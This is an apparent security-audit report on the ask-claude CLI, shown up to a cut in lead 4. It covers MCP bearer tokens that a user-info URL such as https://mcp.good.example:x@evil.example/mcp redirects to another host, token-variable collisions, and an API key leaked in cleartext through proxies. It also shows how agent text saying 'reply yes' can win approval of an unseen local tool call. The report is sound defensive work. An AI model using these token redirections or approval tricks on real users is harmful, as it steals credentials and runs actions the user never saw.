# Needs validation

This file lists all 17 unresolved records in `findings.json`. All of them are `needs_validation`. None is confirmed, and none has a severity. Each record names a specific, source-grounded boundary hypothesis. Each is blocked by a fact this run could not observe.

The run executed no target code, because no OS-enforced sandbox was available (see `REPORT.md` part 1). So every record still lacks the bounded local observation that confirmation requires. Several are also blocked by a provider, terminal, kernel or deployment fact that is not visible in the repository.

The records are listed in the order the report suggests the owner look at them first. That order is a judgement of attention, not a severity. It puts credential exposure to another host first, then approval binding at the model-to-local-action boundary, then fail-open handling of restrictions the user chose, and last the integrity of the reported outcome and availability.

Each section copies the record's description, root cause, trace, evidence, blockers and resolution plans from `findings.json`, with only the formatting changed. The affected-boundary line restates the record's description in one sentence. The "Phase 5" line gives the independent record-verification decision from `report-inputs.json`.

Every local plan below assumes an OS-enforced sandbox, which was not available in this run. Every owner-observed check is a step for the owner, using their own test resources. None is a live test for anyone else to run.

## Index

1. [--mcp URL with user info selects one host's token while the URL connects to another host](#lead-1)
2. [Per-host MCP token variable fold is non-injective, so another host can receive a server's token](#lead-2)
3. [Proxy environment routes the plain-http loopback API request, API key included, through a network proxy](#lead-3)
4. [Tool-confirmation prompt goes to stderr while the approval is read from /dev/tty, so with stderr redirected a typed 'yes' approves a call whose input and question were never shown on the terminal](#lead-4)
5. [The agent tool-confirmation prompt takes terminal type-ahead as its answer, so a line typed before the prompt appeared can approve a local MCP or server tool call](#lead-5)
6. [In agent chat Pipe mode, a stdin worker thread keeps reading the terminal during turns and competes with ask_tty for the confirmation answer](#lead-6)
7. [Approval line leaves invisible format and tag code points in tool input unescaped](#lead-7)
8. [State-directory gate checks only the leaf; later by-name opens follow a directory another account can swap through a writable ancestor](#lead-8)
9. [--mcp-tool entries separated by tab or newline pass config::check but leave an --mcp server with every tool enabled](#lead-9)
10. [Untrusted retrieved content can drive every tool of a credentialed --mcp server with no deterministic gate](#lead-10)
11. [Rust --memory access suffix other than exact ':ro' silently attaches the memory store without read_only](#lead-11)
12. [Custom-tool round cap (ROUNDS=8) is skipped for every requires_action round that also carries an agent.tool_use ask](#lead-12)
13. [A session stream that ends or fails before the idle/terminated event is reported as a completed turn (exit 0, logged as success, session remembered), and no user.interrupt is sent](#lead-13)
14. [Raw-substring turn-end framing can be triggered by a nested object in model-controlled tool input, so the turn is reported as a clean exit 0 while the session is still running](#lead-14)
15. [A Messages reply cut off mid-stream (failed read, timeout or early EOF) is saved to the chat and logged as a successful turn, and the process exits 0](#lead-15)
16. [Model-sized tools/call write to a stalled --local-mcp server blocks the main thread with no deadline, and Ctrl-C/SIGTERM/SIGHUP cannot interrupt it](#lead-16)
17. [`agent tools` prints local MCP tool metadata to the terminal with C1 controls and bidi overrides left raw](#lead-17)

---

<a id="lead-1"></a>
## Lead 1: --mcp URL with user info selects one host's token while the URL connects to another host

- **Fingerprint:** `rust/src/lib.rs:url-host:mcp-userinfo-token-host-mismatch`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** corrected: non-material correction applied (v5-12)
- **Affected boundary:** MCP token to server. The per-host token is chosen from the authority text before '@', while a standard URL parser connects to the host after '@'. If the API connector honours user info, the good server's token reaches a third-party host.

### Description (verified record text)

request::host, request::hostname and request::token_variable all derive an --mcp server's identity from crate::url_host(url, &['/', ':']), which takes the text after '://' up to the first '/' or ':' and has no notion of user info ('@'). For --mcp https://mcp.good.example:x@evil.example/mcp the derived host is 'mcp.good.example': the server is named mcp-good-example, --mcp-tool mcp.good.example:<tool> is accepted by config::check and becomes its allowlist, and the value of ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE is attached as authorization_token. The URL itself is sent to the API unchanged, and an RFC 3986/WHATWG parser reads 'mcp.good.example:x' as user info and evil.example as the host. config::check only requires a literal https:// prefix for --mcp, whereas base_url_gate refuses any '@' for exactly this starts-like-X-connects-to-Y differential. If the API's MCP connector accepts a URL with user info and connects to the host after '@' with the Bearer token, the good server's token goes to the evil.example operator. The attacker is a third party who supplies the --mcp URL (an install snippet, README or wrapper script) to a user who has that per-host token exported; the URL is visible on the command line, so some user inattention is required. The bash oracle (lib/request.jq host/hostname: capture("^[a-z]+://(?<h>[^/:]+)")) has the same cut, so the pattern is shared and carried into Rust. Token selection by the wrong host is fully determined by source. Whether the token is actually delivered to evil.example depends on API-side URL handling.

### Claimed root cause

url_host (rust/src/lib.rs:688-695) treats everything before the first '/' or ':' as the host and ignores user info, and config::check (rust/src/config.rs:73-81) accepts '@' in --mcp authorities, so the host that names the server and selects its token can differ from the host the URL connects to.

### Source trace

1. **entrypoint**: `rust/src/cli.rs:145` (`RequestFlags::mcp`). --mcp takes arbitrary strings (Vec<String>), e.g. https://mcp.good.example:x@evil.example/mcp, supplied on argv from a third-party snippet.
2. **propagation**: `rust/src/config.rs:76` (`config::check`). The only check on each --mcp word is v.starts_with("https://"). '@' is not refused, unlike base_url_gate at config.rs:224. hostname() feeds the --mcp-tool host match (config.rs:84-100), so mcp.good.example:<tool> is accepted.
3. **propagation**: `rust/src/lib.rs:693` (`url_host`). host = rest[..first '/' or ':'], giving 'mcp.good.example' rather than the host after '@' (evil.example).
4. **propagation**: `rust/src/request.rs:133` (`token_variable`). format!("ASK_CLAUDE_MCP_TOKEN_{}", host(url) upper-cased, '-' to '_') gives ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE.
5. **propagation**: `rust/src/request.rs:143` (`mcp_token`). std::env::var(token_variable(url)) reads the good server's token as this URL's token.
6. **sink**: `rust/src/request.rs:59` (`body`). mcp_servers entry {type: url, url: <userinfo URL unchanged>, name: 'mcp-good-example' (line 56), authorization_token: <good token>} is sent to the API, which connects to the server named by the URL.

### Verified evidence

- `rust/src/lib.rs:688`: url_host: splits on '://', requires a lowercase scheme, and cuts the host at the first stop char. There is no '@' handling.
- `rust/src/request.rs:108`: host() calls url_host(url, &['/', ':']). hostname() at line 124 does the same, and toolset() matches --mcp-tool entries against hostname().
- `rust/src/config.rs:224`: base_url_gate refuses any '@' because 'http://localhost:@x starts like localhost and connects to x'. config::check has no equivalent refusal for --mcp.
- `rust/src/config.rs:76`: The --mcp check is only !v.starts_with("https://").
- `rust/src/stream.rs:26`: MCP activity is shown as '(mcp <server_name>)' from the mcp_tool_use event, i.e. the name the request assigned (mcp-good-example), so the display reinforces the spoofed identity.

### Exact blockers

- Whether the Anthropic Messages API MCP connector (mcp-client-2025-11-20 beta) accepts an https mcp_servers URL with user info, and if so connects to the host after '@' and sends authorization_token there as a Bearer token, is API-side behavior that is not visible in the repository and cannot be observed without contacting the deployed service.
- No OS-enforced sandbox is available in this run, so no target code (cargo test or a function harness for request::body/config::check) may be executed. The client-side token-selection result is established from source only.

### Bounded local resolution plan

In an approved sandbox (no network, empty env except the variables below, read-only target, scratch-only writes), add a unit test in rust/src/request.rs that calls body() with Args{mcp: vec!["https://mcp.good.example:x@evil.example/mcp".into()], mcp_tool: "mcp.good.example:search".into(), ..Default::default()} and only ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE=dummy-good set. Expect mcp_servers[0] == {type: url, url: that URL, name: 'mcp-good-example', authorization_token: 'dummy-good'}, and expect the mcp_toolset entry's allowlist to hold 'search'. Also assert that config::check accepts RequestFlags with the same --mcp/--mcp-tool. For the standard-parser reading, the url crate is not in rust/Cargo.lock, so add the dev-dependency http = "=1.5.0" (already locked as a ureq dependency, so it adds no new crate) and assert "https://mcp.good.example:x@evil.example/mcp".parse::<http::Uri>().unwrap().host() == Some("evil.example").

### Owner-observed check

Owner-observed, non-destructive: send one Messages request with the mcp-client beta and mcp_servers [{type: url, url: 'https://decoy.owner.example:x@listener.owner.example/mcp', name: 'decoy', authorization_token: 'dummy-token'}] where both hosts are owner-controlled. Record whether the API rejects the URL, strips the user info, connects to decoy.owner.example, or connects to listener.owner.example and presents 'Authorization: Bearer dummy-token' there (check the listener's access log). Use no real token.

---

<a id="lead-2"></a>
## Lead 2: Per-host MCP token variable fold is non-injective, so another host can receive a server's token

- **Fingerprint:** `rust/src/request.rs:token-variable:non-injective-host-fold`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-14)
- **Affected boundary:** MCP token to server. One ASK_CLAUDE_MCP_TOKEN_<HOST> variable serves several distinct hosts, so a lookalike host can be given another server's token.

### Description (verified record text)

token_variable (rust/src/request.rs:133-138) builds ASK_CLAUDE_MCP_TOKEN_<HOST> from host() (request.rs:107-119), which turns every char outside [A-Za-z0-9_-] into '-', then upper-cases and turns '-' into '_'. '.', '-' and '_' therefore all become '_', so distinct DNS hosts such as mcp.good.example and mcp-good.example (a separately registrable domain) both read ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE. Every IPv6-literal host also reads ASK_CLAUDE_MCP_TOKEN__, because url_host (rust/src/lib.rs:693) cuts '[::1]' at the first ':' and leaves '['. A user who keeps the good server's token exported (the documented per-host setup, and the environment is often set for other tools) and runs --mcp https://mcp-good.example/... (a lookalike or a recommended third-party server) gets that token placed in authorization_token on the lookalike's mcp_servers entry (request.rs:57-59). If both hosts are on one command line, both entries carry the same token and the same name/mcp_server_name (request.rs:56,161). config::check refuses the shared ASK_CLAUDE_MCP_TOKEN with several servers for exactly this reason (config.rs:108-116), but it only uses the per-host names it computes (config.rs:80) in an error message. It never checks them for collisions, and nothing binds a token to one exact host. The bash oracle shares the pattern (lib/request.jq:73), and run 2 locally confirmed it at low severity as lib/request.jq:mcp_token:host-variable-name-collision. That strengthens the Rust finding, since the goldens hold the two to the same bytes. The Rust path was verified from source only.

### Claimed root cause

token_variable (rust/src/request.rs:133-138) is a lossy, non-injective encoding of the host (host() at request.rs:107-119 collapses '.', '-', '_' and any other byte to one character), and neither config::check (rust/src/config.rs:73-116) nor request::body checks that a token variable or server name maps to exactly one distinct host. So the variable does not bind the credential to a single server.

### Source trace

1. **entrypoint**: `rust/src/cli.rs:145` (`RequestFlags::mcp`). --mcp https://mcp-good.example/mcp (alone, or alongside https://mcp.good.example/mcp) as a repeatable global flag. The help text at line 143 promises the token comes from ASK_CLAUDE_MCP_TOKEN_<HOST>. The URL comes from a lower-trust third party (a lookalike or recommended server), and the token was exported for a different host.
2. **propagation**: `rust/src/config.rs:80` (`config::check`). Requires only an https:// prefix (line 76) and computes each server's token variable only for the shared-token error message. There is no uniqueness check across servers, and nothing compares an exported per-host variable with the exact host. The only refusal is for the shared ASK_CLAUDE_MCP_TOKEN with several servers (lines 110-116).
3. **propagation**: `rust/src/lib.rs:192` (`request_args`). Forwards r.mcp unchanged into request::Args.mcp.
4. **propagation**: `rust/src/request.rs:115` (`host`). Every char outside [A-Za-z0-9_-] (including '.') becomes '-', so mcp.good.example and mcp-good.example both become mcp-good-example. For https://[::1]/x, url_host (lib.rs:693) yields '[', which becomes '-'.
5. **propagation**: `rust/src/request.rs:136` (`token_variable`). Upper-cases and maps '-' to '_', giving ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE for both hosts (and ASK_CLAUDE_MCP_TOKEN__ for every IPv6 literal).
6. **propagation**: `rust/src/request.rs:143` (`mcp_token`). Reads that variable from the environment and returns its non-empty value for whichever URL produced the name, here the lookalike host's URL.
7. **sink**: `rust/src/request.rs:59` (`body`). authorization_token is set on the mcp-good.example mcp_servers entry in the Messages request body. The MCP connector is expected to present it to the server at that URL (not observable from source).

### Verified evidence

- `rust/src/request.rs:133`: token_variable: format!("ASK_CLAUDE_MCP_TOKEN_{}", host(url).to_ascii_uppercase().replace('-', "_")). The doc comment (129-132) calls it 'the variable this server's own token is read from'.
- `rust/src/request.rs:107`: host(): url_host cut at '/' or ':', with every char outside [A-Za-z0-9_-] mapped to '-' (lines 111-117).
- `rust/src/lib.rs:693`: url_host takes the text before the first stop char, so an IPv6 literal '[::1]' is cut to '[' and every IPv6 host folds to the same variable ASK_CLAUDE_MCP_TOKEN__.
- `rust/src/config.rs:108`: Comment states the invariant: 'a token is one server's credential: sent to several, each server's operator would receive the others''. It is enforced only for the shared ASK_CLAUDE_MCP_TOKEN (110-116), not for colliding per-host variables.
- `rust/src/request.rs:56`: Colliding hosts also get the same mcp_servers name, and toolset (line 161) the same mcp_server_name, so the two-server variant sends two entries with one ambiguous name and one shared token.

### Exact blockers

- No OS-enforced sandbox is available in this run, so no target code (cargo test, or a harness calling request::token_variable/request::body) may be executed. The Rust request body containing the colliding token is established from source only, not locally observed. The bash twin's identical behavior was locally observed in run 2.
- That the Messages API MCP connector presents authorization_token as a bearer credential to the server at the entry's URL is provider behavior that is not observable from source or offline. For the two-server variant, whether the API rejects or routes two mcp_servers entries with the same name is also unobservable, and decides whether that variant reaches either server. The single-server lookalike variant does not depend on duplicate-name handling.

### Bounded local resolution plan

In an approved sandbox (no network, empty allowlisted env, read-only target, scratch-only writes, low CPU/wall limits), add a scratch unit test. (1) Assert request::token_variable('https://mcp.good.example/x') == request::token_variable('https://mcp-good.example/x') == 'ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE', and token_variable('https://[::1]/x') == token_variable('https://[2001:db8::1]/x') == 'ASK_CLAUDE_MCP_TOKEN__'. (2) With only ASK_CLAUDE_MCP_TOKEN_MCP_GOOD_EXAMPLE=dummy-not-real set, call request::body with mcp=['https://mcp-good.example/x'] and expect mcp_servers[0].authorization_token == 'dummy-not-real'. (3) With mcp=['https://mcp.good.example/x','https://mcp-good.example/x'], run config::check, expect Ok, and expect body() to give both entries authorization_token 'dummy-not-real' and name 'mcp-good-example'. A fix should make (2) carry no token and (3) exit 2.

### Owner-observed check

Owner-observed, non-destructive: the owner runs two header-logging https endpoints they control whose hosts fold to the same variable (e.g. mcp.owner-test.example and mcp-owner-test.example). They set only ASK_CLAUDE_MCP_TOKEN_MCP_OWNER_TEST_EXAMPLE=dummy-not-real and run one request with --mcp https://mcp-owner-test.example/mcp, then one with both URLs. They record which endpoint receives 'Authorization: Bearer dummy-not-real', and whether the API returns an error for the duplicate mcp_servers name.

---

<a id="lead-3"></a>
## Lead 3: Proxy environment routes the plain-http loopback API request, API key included, through a network proxy

- **Fingerprint:** `rust/src/transport.rs:Http::new:env-proxy-carries-loopback-http-key`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-17)
- **Affected boundary:** API key to network. base_url_gate allows plain http only for loopback so the key never crosses a network; an environment proxy can still tunnel that cleartext request, with the key and any body tokens, to a proxy host.

### Description (verified record text)

base_url_gate accepts plain http only for localhost, 127.0.0.1 or [::1], 'so the key never travels in clear over a network' (rust/src/config.rs:218-219, check at 234). Both HTTP transports build their ureq agents from ureq::Agent::config_builder() and set http_status_as_error, max_redirects(0) and both timeouts, but never touch the proxy (rust/src/transport.rs:47-52; rust/src/transport/sessions.rs:124-133). No file under rust/src mentions a proxy. ureq is pinned at =3.5.2 (rust/Cargo.toml:31). Its Cargo.lock checksum 3ac5cecf...a59d matches the sha256 of the locally cached .crate. In that crate, Config::default sets proxy: Proxy::try_from_env() (src/config.rs:1073). try_from_env takes the first parseable value among ALL_PROXY, all_proxy, HTTPS_PROXY, https_proxy, HTTP_PROXY and http_proxy, whatever the target's scheme (src/proxy.rs:232-249). So a variable a user sets only for https traffic also catches the http loopback request. connect_proxy_uri does not check the scheme (src/config.rs:251-259). For an http or https proxy, the CONNECT connector (src/unversioned/transport/connect.rs:37-56, 109) sends 'CONNECT <target_host>:<port>' unless NO_PROXY matches, and the proxy side resolves the target (src/proxy.rs:56-59, resolve_target=false). The application then writes the HTTP/1.1 request into that tunnel without TLS. The request carries x-api-key (transport.rs:84; sessions.rs:148, 224) or Authorization: Bearer for -p openai (transport.rs:81). Its body can carry mcp_servers[].authorization_token (request.rs:59) or, for agent --repo, the GitHub token as the resource authorization_token (session.rs:211, sent at sessions.rs:172). The proxy operator and anyone on the path to the proxy can read all of this. So can whatever listens on the target port in the proxy's own loopback namespace. NO_PROXY handling is narrower than many users expect. Entries are split on ',' with no trimming (src/proxy.rs:579), so 'localhost, 127.0.0.1' yields the exact-host entry ' 127.0.0.1', which never matches. A present but empty NO_PROXY returns before no_proxy is read (src/proxy.rs:577-580). Calibration: the bash twin's curl also honours proxy variables, and the repository has no --noproxy or proxy override anywhere. The pattern is shared, which does not excuse the Rust finding. The source chain is complete, but no binary was built or run: the cleartext CONNECT tunnel is established from source and library source, not observed.

### Claimed root cause

The loopback-http exception in config::base_url_gate assumes the request reaches a socket on this host directly. transport::Http::new (rust/src/transport.rs:47) and transport::sessions::Http::new (rust/src/transport/sessions.rs:126) keep ureq 3.5.2's default Proxy::try_from_env(), so any ALL_PROXY/HTTPS_PROXY/HTTP_PROXY variable (or its lowercase form) without a matching NO_PROXY entry diverts the plain-http request, key and tokens included, to a proxy host.

### Source trace

1. **entrypoint**: `rust/src/config.rs:234` (`config::base_url_gate`). Plain http://localhost[:port][/...], http://127.0.0.1... or http://[::1]... from --base-url, ANTHROPIC_BASE_URL or OPENAI_BASE_URL is accepted. Line 219 states the premise that the key never travels in clear over a network. The lower-trust input on this path is the process environment's implicit *_PROXY and NO_PROXY variables, which the architecture describes as 'often set for other tools'.
2. **propagation**: `rust/src/lib.rs:212` (`lib::open_transport`). The gated provider and the API key go to transport::Http::new when ASK_CLAUDE_REPLAY is unset. agent.rs:962 hands the same base URL and key to sessions::Http::new.
3. **propagation**: `rust/src/transport.rs:47` (`transport::Http::new`). ureq::Agent::config_builder() starts from Config::default, whose proxy is Proxy::try_from_env() in ureq 3.5.2. Lines 47-52 add no .proxy(None), and neither does sessions.rs:126-131. Nothing in rust/src clears the proxy variables.
4. **propagation**: `rust/src/transport.rs:84` (`transport::Http::send`). The API key goes into the x-api-key header (or Authorization: Bearer at line 81 for -p openai) of a POST to the plain-http loopback URL.
5. **sink**: `rust/src/transport.rs:88` (`transport::Http::send`). request.send(&body). If the environment names a proxy and NO_PROXY does not match, ureq's CONNECT connector opens 'CONNECT localhost:<port>' to the proxy host. The cleartext HTTP request, with the key header and any token-bearing body, then goes into that tunnel.

### Verified evidence

- `rust/src/config.rs:219`: The stated invariant: plain http to a loopback host only, 'so the key never travels in clear over a network'.
- `rust/src/transport.rs:47`: The Messages transport's ureq config sets http_status_as_error(false), max_redirects(0), timeout_global and timeout_connect, and has no proxy override.
- `rust/src/transport/sessions.rs:126`: The sessions transport builds its calls, streams and downloads agents from config_builder() with no proxy override. The key goes in x-api-key at line 148 and in the upload header at line 224. Session-create bodies go out at line 172.
- `rust/Cargo.toml:31`: ureq = "=3.5.2". Cargo.lock:1256-1259 resolves 3.5.2 with checksum 3ac5cecf619ca81f66a96482db09687c9f7465af65f4300a8c30cca05bd5a59d, which equals the sha256 of ~/.cargo/registry/cache/.../ureq-3.5.2.crate. Read in that crate: Config::default proxy = Proxy::try_from_env() (src/config.rs:1073). try_from_env takes the first of ALL_PROXY/all_proxy/HTTPS_PROXY/https_proxy/HTTP_PROXY/http_proxy for every scheme (src/proxy.rs:232-249). connect_proxy_uri has no scheme check (src/config.rs:251-259). The CONNECT is skipped only when NO_PROXY matches (src/unversioned/transport/connect.rs:37-56, CONNECT line at 109). NO_PROXY is split on ',' without trimming (src/proxy.rs:579), and Http/Https proxies do not resolve the target locally (src/proxy.rs:56-59).
- `rust/src/request.rs:59`: Messages bodies carry mcp_servers[].authorization_token from ASK_CLAUDE_MCP_TOKEN[_<HOST>], which crosses the proxy in clear along with the key.
- `rust/src/session.rs:211`: agent --repo session-create bodies carry the GitHub token as the github_repository resource's authorization_token. They are sent through sessions.rs:172 on the same proxied plain-http path.

### Exact blockers

- No OS-enforced sandbox is available in this run, so the binary was not built or run against loopback fixtures with HTTP_PROXY set. The CONNECT tunnel carrying the cleartext key is established only from repository source plus checksum-verified ureq 3.5.2 source, not observed at runtime.
- The decisive library behaviour (Config::default proxy from the environment, CONNECT tunnelling for http targets, untrimmed NO_PROXY entries) comes from the locally cached ureq-3.5.2 crate. Its sha256 equals the rust/Cargo.lock checksum, but it lies outside the repository and cannot be cited as a repository line.
- Exposure depends on an environment fact outside source: whether users run a plain-http loopback --base-url, ANTHROPIC_BASE_URL or OPENAI_BASE_URL in a shell that exports ALL_PROXY, HTTPS_PROXY or HTTP_PROXY (or a lowercase form) without a NO_PROXY entry matching that exact host form.

### Bounded local resolution plan

In an OS-enforced sandbox: external network disabled, read-only target, scratch-only writes, low CPU, memory and wall-clock limits. Build rust/ offline from the vendored lockfile. Start a loopback fixture on 127.0.0.1:3128 that logs every received byte to scratch and answers any CONNECT with 'HTTP/1.1 200 Connection established\r\n\r\n', then keeps reading. Leave nothing listening on 8080. Case 1: env -i HOME=$SCRATCH XDG_STATE_HOME=$SCRATCH ANTHROPIC_API_KEY=dummy-key-0000 HTTP_PROXY=http://127.0.0.1:3128 ask-claude --base-url http://localhost:8080 hi. Confirmed if the log shows 'CONNECT localhost:8080 HTTP/1.1' followed by a plaintext 'POST /v1/messages' carrying 'x-api-key: dummy-key-0000'. Case 2: as case 1 but with HTTPS_PROXY instead of HTTP_PROXY. Expect the same bytes, because the variable is scheme-agnostic. Case 3: add NO_PROXY=localhost. Expect no bytes at the fixture. Case 4: NO_PROXY='localhost, 127.0.0.1' with --base-url http://127.0.0.1:8080. Expect bytes at the fixture, because of the untrimmed entry. Case 5: NO_PROXY='' together with no_proxy=localhost. Expect bytes. Case 6: --base-url http://[::1]:8080 with NO_PROXY=::1. Record whether the fixture receives bytes. Case 7: repeat case 1 for `ask-claude agent ...` with ASK_CLAUDE_REPLAY unset and a dummy ASK_CLAUDE_MCP_TOKEN or GITHUB_TOKEN, to cover sessions::Http and token-bearing bodies. Only dummy values are used throughout. After a fix, a unit test must pass: with HTTP_PROXY set, both Http::new constructors yield agents whose config().proxy() is None for an http:// root.

### Owner-observed check

Owner-observed and non-destructive: ask whether users who point ask-claude at a loopback http gateway or stub run it in shells, devcontainer images or corporate profiles that export ALL_PROXY, HTTPS_PROXY or HTTP_PROXY (or a lowercase form). Ask whether those images set NO_PROXY or no_proxy to the exact host form used (localhost, 127.0.0.1 or [::1]) without spaces after commas, and whether NO_PROXY is ever exported empty. Also ask whether the proxy in those environments is remote, or a local agent on this host (where the exposure narrows to that agent).

---

<a id="lead-4"></a>
## Lead 4: Tool-confirmation prompt goes to stderr while the approval is read from /dev/tty, so with stderr redirected a typed 'yes' approves a call whose input and question were never shown on the terminal

- **Fingerprint:** `rust/src/agent.rs:ask_tty:prompt-on-unchecked-stderr`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** corrected: material trace change, re-verified by a fresh verifier (v5-04, then v5r-04)
- **Affected boundary:** Model to local action (approval binding). The prompt that shows the action goes to stderr, while the answer is read from /dev/tty. So the action that is approved is not tied to the terminal that supplies the answer.

### Description (verified record text)

With ASK_CLAUDE_CONFIRM unset or empty (Policy::Ask, rust/src/session.rs Gate::new), Agent::answer treats the run as attended when stdin is a terminal and /dev/tty opens (rust/src/agent.rs:861). It never checks stderr. Gate::confirm then calls ask_tty, which opens /dev/tty read-only, writes 'allow <name> <input>? [y/N/a(lways)] ' with eprint! to fd 2 and reads the answer from /dev/tty (rust/src/agent.rs:902-909). If the user has redirected stderr away from the terminal (for example `ask-claude agent "..." 2>agent.log`), the question and the tool input go only to the file. The streamed session output stays on the stdout terminal. That includes the untrusted agent's own message text (through safe) and, for agent.tool_use and agent.custom_tool_use, only a bare '(<name>) ' marker (rust/src/session.rs:17). The input/arguments and the y/N question are never shown there, and the process blocks silently on the /dev/tty read. Text from the untrusted agent can ask the user to 'reply yes to continue'. While the confirmation is pending the terminal is in cooked mode, so the typed line echoes normally. A y/Y/yes typed on the terminal is read as approval of the pending call: user.tool_confirmation result allow (rust/src/session.rs:457-465), or LocalMcp::call of a model-chosen --local-mcp tool with model-chosen arguments on this machine (rust/src/session.rs:494-497). a/A/always also approves that shown name with no prompt for the rest of the process (rust/src/session.rs:383). The user never saw the specific action, so the approval is not bound to it. The `ask-claude: allowed ...` line also goes to stderr only. Agent chat (rust/src/agent.rs:618) takes the same path: Input::new still picks reedline Terminal mode when stdout alone is a terminal (rust/src/chat.rs:45), but reedline 0.53.0 paints its prompt and edit line on stderr (rust/src/chat.rs:116 comment; reedline Painter writes to BufWriter<Stderr>), so with 2>log the chat editor's own display also lands in the file. Chat is therefore visibly degraded rather than silently normal, which may alert the user but also removes any visible cue separating 'turn ended, type the next message' from 'confirmation pending'. The bash oracle shares the pattern (lib/agent-turn.bash:86, `read -r -p ... </dev/tty`, whose prompt bash shows on stderr). That strengthens the Rust finding rather than excusing it. Conditions that limit it: stderr must be redirected away from the terminal while stdin stays on it, Policy::Ask must be in effect, and the user must type an affirmative token on a terminal that shows no prompt.

### Claimed root cause

Gate::confirm's attended-run precondition (tty = stdin.is_terminal() && File::open("/dev/tty").is_ok(), rust/src/agent.rs:861) checks only where the answer comes from, not where the prompt goes. ask_tty opens /dev/tty read-only and prints the only display of the tool input and the question with eprint! to whatever fd 2 is (rust/src/agent.rs:902-903). The displayed-action half of the approval is therefore never bound to the terminal that supplies the answer. The bash oracle has the same pattern (lib/agent-turn.bash:86, `read -r -p ... </dev/tty`, whose prompt goes to stderr).

### Source trace

1. **entrypoint**: `rust/src/agent.rs:1052` (`Streamed::take`). Each session SSE data line from the API is parsed into an event. Its agent.message text and agent.tool_use/agent.custom_tool_use name and input are chosen by the untrusted model/agent.
2. **propagation**: `rust/src/agent.rs:1055` (`Streamed::take`). session::line(event) is written to stdout as each event arrives, so the agent's text stays on the terminal when only stderr is redirected.
3. **propagation**: `rust/src/session.rs:17` (`session::line`). A tool_use or custom_tool_use event prints only '(<name>) '. The input is not printed on stdout.
4. **propagation**: `rust/src/session.rs:92` (`session::fold`). The agent.tool_use and agent.custom_tool_use events the idle stop_reason waits on become asks and custom, with the model's name and input.
5. **propagation**: `rust/src/agent.rs:810` (`Agent::turn`). On requires_action the fold is answered through self.answer(&fold). Rounds with asks are not counted toward the cap (lines 805-808).
6. **propagation**: `rust/src/agent.rs:861` (`Agent::answer`). tty = stdin.is_terminal() && /dev/tty opens. Whether stderr reaches the terminal is never checked.
7. **propagation**: `rust/src/session.rs:379` (`Gate::confirm`). Under Policy::Ask with tty true and no prior always for the name, the gate calls ask with 'allow {name} {input}? [y/N/a(lways)] '.
8. **propagation**: `rust/src/agent.rs:903` (`ask_tty`). The prompt goes with eprint! to fd 2, which can be a file or a pipe, while the answer is read from the /dev/tty handle opened read-only at line 902 (byte loop at line 909).
9. **sink**: `rust/src/session.rs:381` (`Gate::confirm`). y/Y/yes returns true, and a/A/always returns true and inserts the name into always (line 383). session::answer then emits user.tool_confirmation result allow (session.rs:464-465) or runs server.call on the local MCP server (session.rs:497).

### Verified evidence

- `rust/src/agent.rs:861`: let tty = std::io::stdin().is_terminal() && std::fs::File::open("/dev/tty").is_ok(); stderr is not considered.
- `rust/src/agent.rs:902`: ask_tty opens /dev/tty with File::open (read-only) and never writes the prompt to it.
- `rust/src/agent.rs:903`: eprint!("{prompt}") sends the only display of the tool input and the question to fd 2.
- `rust/src/agent.rs:1055`: Session events are written to stdout as they arrive, so they remain visible when only stderr is redirected.
- `rust/src/session.rs:17`: On stdout a tool call shows only '(<name>) ', without its input. The approval question is not shown there.
- `rust/src/session.rs:383`: An a/always answer adds the shown name to the in-memory always set, so later calls of that name are approved with no prompt for the rest of the process.
- `rust/src/session.rs:497`: An allowed custom call runs LocalMcp::call with the model's arguments on the user's machine.
- `rust/src/chat.rs:45`: Input::new picks reedline Terminal mode whenever stdin and either stdout or stderr is a terminal, so agent chat (agent.rs:618) with only stderr redirected still runs the editor and still reaches the same confirmation path.
- `rust/src/chat.rs:116`: The code notes that reedline paints on stderr (reedline 0.53.0 Painter uses BufWriter<Stderr>), so with stderr redirected the chat prompt and edit line also go to the file. In chat the terminal is visibly degraded, and it gives no cue that separates a pending confirmation from the next-message prompt.
- `rust/tests/terminal.rs:72`: The pty harness can redirect only stdout (start_with/start_env append ' > file'). It has no stderr-redirected variant, and the agent confirmation tests (lines 406, 425) run with stderr on the pty, so this configuration is untested.
- `lib/agent-turn.bash:86`: The oracle's `read -r -p ... </dev/tty` also prompts on stderr. The goldens keep the two the same, which strengthens the Rust finding rather than excusing it.

### Exact blockers

- No OS-enforced sandbox (network-disabled, empty allowlisted environment, read-only target, scratch-only writes, resource and wall-clock limits) is available in this run, so the target binary cannot be built or run under a pty with stderr redirected. Without that run there is no observed result showing that the approval prompt is absent from the terminal and that 'yes' typed on that terminal produces user.tool_confirmation result allow in the request log. Source fully determines the fd routing, but the schema requires that bounded local observation for confirmed.

### Bounded local resolution plan

Inside an OS-enforced sandbox (no network, empty allowlisted environment, read-only target and toolchain, scratch-only writes, low CPU/memory/wall-clock limits), build rust/ offline from the committed Cargo.lock. Reuse the rust/tests/terminal.rs harness. Build the replay with asking(dir, 1), which streams one agent.tool_use (name bash, input {"command":"echo 1"}) that the idle requires_action waits on. Optionally prepend an agent.message line whose text says 'reply yes to continue' to 1.sse. Call Terminal::start_env directly with args ["agent","ping"] and the same ASK_CLAUDE_REPLAY/ASK_CLAUDE_AGENT/ASK_CLAUDE_ENVIRONMENT env that agent_on_terminal sets, with ASK_CLAUDE_CONFIRM unset, and extend start_env so the script -c command line also appends ` 2> <scratch>/stderr.txt`. (1) Wait until the pty screen shows '(bash) ' (and the agent text if it was added). Assert that the screen contains no 'allow bash' and no '[y/N/a(lways)]'. (2) Type "yes\r" on the pty. (3) Assert that results(dir) is ["allow"] for sevt_T1, and that the prompt and 'ask-claude: allowed bash' appear only in stderr.txt. Repeat with "a\r" and asking(dir, 2) to show that the second call is allowed and that '[y/N/a(lways)]' appears once in stderr.txt and never on the screen. Regression for a fix: the same run should show the prompt on the pty (write it to the /dev/tty handle opened read-write), or deny with a message when the prompt cannot be shown on the answering terminal. Use dummy fixture data only, and stop once the allow result is 